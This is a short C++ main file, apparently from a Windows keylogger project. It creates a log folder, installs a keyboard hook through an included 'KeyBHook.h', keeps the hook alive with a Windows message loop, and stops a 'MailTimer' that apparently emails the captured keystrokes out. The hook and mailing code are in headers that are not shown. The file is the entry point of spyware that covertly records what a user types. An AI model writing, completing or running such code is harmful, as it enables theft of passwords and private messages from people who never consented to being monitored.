#include <iostream>
#include <windows.h>
#include "Base64.h"
#include "Helper.h"
#include "Timer.h"
#include "IO.h"
#include "KeyBHook.h"

int main()
{
    MSG msg;
    IO::MKDir(IO::GetPath(true));
    InstallHook();

    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
   MailTimer.Stop();
    return 0;
}
